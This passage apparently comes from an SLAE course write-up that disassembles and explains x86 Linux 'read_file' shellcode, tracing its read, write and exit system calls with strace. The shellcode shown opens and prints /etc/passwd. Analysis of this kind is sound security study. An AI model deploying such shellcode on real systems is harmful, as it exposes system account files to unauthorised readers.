The **ecx** register which represents the second argument of the **read** system call will point at the top of the stack after the execution of the following two instructions **mov edi, esp** and **mov ecx, edi**. The second argument indicates the buffer from which the **read** system call will read the contents.&nbsp;

```
mov edi,esp ; moves esp to edi 
mov ecx,edi ; moves edi to esp 
mov edx,0x1000 ; moves 0x1000 ( 4096 in decimal ) to edx register
int 0x80 ; executes the read system call
```

Furthermore, the **edx** register will hold the hex value **0x1000** ( 4096 in decimal ). Moreover, as we mentioned before, the **edx** register refers to the third argument of the **read** system call where the **read** system call reads up to 4096 bytes from file descriptor **fd** into the buffer starting at **buf.** After calling the instruction **int 0x80** the **read** system call will be executed and then the return value will contain the number of bytes read from the specified file descriptor.

Moreover, according with the above results, the **read** system call will be constructed as follows&nbsp;

```
**read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096)**
```

Next, we will continue to analyse the following code snippet&nbsp;

```
0000001E 89C2 mov edx,eax
00000020 B804000000 mov eax,0x4
00000025 BB01000000 mov ebx,0x1
0000002A CD80 int 0x80
```

Furthermore, the **eax** register will contain the return value of **read** system call, referring to the number of bytes read from the specified file descriptor. In order to see the number of bytes read from the specified file descriptor we will use a tool called **strace.** According to the main [site](https://strace.io/) of the **&nbsp;** [strace](http://man7.org/linux/man-pages/man1/strace.1.html) utility, the **strace** is a diagnostic, debugging and instructional userspace utility for Linux. It is used to monitor and tamper with interactions between processes and the Linux kernel, which include system calls, signal deliveries, and changes of process state. For now all we need to see &nbsp;from **strace** is the return value of the **read** system call.&nbsp;

```
**root@kali** : **~/Documents/SLAE/Assignment5** # strace ./shellcode
[...]
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = **3145**
[...]
```

From **strace** output we are seeing that the **read** system call returned **3145** which will be assigned to **eax** register. Later on the **edx** register will be assigned with the value of **eax** register as seen below

```
mov edx,eax&nbsp; &nbsp; &nbsp; &nbsp;; the returned value of read system call will be moved to edx register from eax register
```

Then the **eax** register will be assigned with the immediate value **0x4** which refers to the write system call as we see at the **unistd\_32.h** header file below

```
**root@kali** : **~/Documents/SLAE/Assignment5** # cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep "\_\_NR\_write "
#define \_\_NR\_write 4
```

The **write** system call prototype is as follows

```
**#include \<unistd.h\>**** ssize\_t write(int **_fd_** , const void \ ***_buf_** , size\_t **_count_** );**
```

As we see the **write** system call takes&nbsp; three arguments. According to the man page the write system call writes up to **count** bytes from the buffer starting at **buf** to the file referred to by the file descriptor **fd**. Also from the [Linux system call table](http://shell-storm.org/shellcode/files/syscalls.html) we can see the registers that referring to write the system call arguments. As we see from the table,&nbsp; the **edx** register refers to the third argument, the **ecx** register to the second and the **ebx** register to the first argument.&nbsp;

Next, the file descriptor will reference the file where the **write** system call will write the counted bytes, so the file descriptor will refer to the standard output which has the value 1 and it will be assigned to the **ebx** register as seen below&nbsp;

```
mov ebx, 0x1&nbsp; ; mov fd of standard output to ebx register
```

Then the write system call will be called using the instruction int 0x80&nbsp;

```
int 0x80 ; execute the write system call
```

According with the above results the **write** system call will be as follows&nbsp;

```
**write(1, "root:x:0:0:root:/root:/bin/bash\n"..., 3145)**
```

The last code portion to analyse regarding&nbsp; the **ndisasm** output is the following&nbsp;

```
0000002C B801000000 mov eax,0x1
00000031 BB00000000 mov ebx,0x0
00000036 CD80 int 0x80
```

As we see above, the first instruction will move the immediate value **0x1** to **eax** register.

```
mov eax,0x1&nbsp; &nbsp; &nbsp; &nbsp;;&nbsp; moves 0x1 to eax register
```

As we see from the header file **unistd\_32.h,** the the value **0x1** refers to the **exit** system call as seen below&nbsp;

```
**root@kali** : **~/Documents/SLAE/Assignment5** # cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep "\_\_NR\_exit "
#define \_\_NR\_exit 1
```

The next instruction assigns the zero value to the **exit** system call providing the value of the status argument. According to the man page of **exit** system call, the value of status is returned to the parent process as the process's exit status, and can be collected using one of the [wait](https://linux.die.net/man/2/wait) family of calls.&nbsp;The&nbsp; **exit** system call used to terminate a program. Every command returns an **exit** status (sometimes referred to as a return status ). A successful command returns zero. The following instruction assigns the **ebx** register with zero value denoting the status of the **exit** system call.&nbsp;

```
mov ebx,0x0 ; ebx register will be assigned with zero
```

Next ,the final instruction **int 0x80** will be used to execute the **exit** system call in order to terminate the program gracefully.&nbsp;

To summarise, from the **read\_file** shellcode analysis the following system calls used&nbsp;

```
**open("/etc/passwd", O\_RDONLY)**
**read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096)**
**write(1, "root:x:0:0:root:/root:/bin/bash\n"..., 3145)**
**exit(0)**
```

<!-- wp:paragraph -->

<!-- /wp:paragraph -->

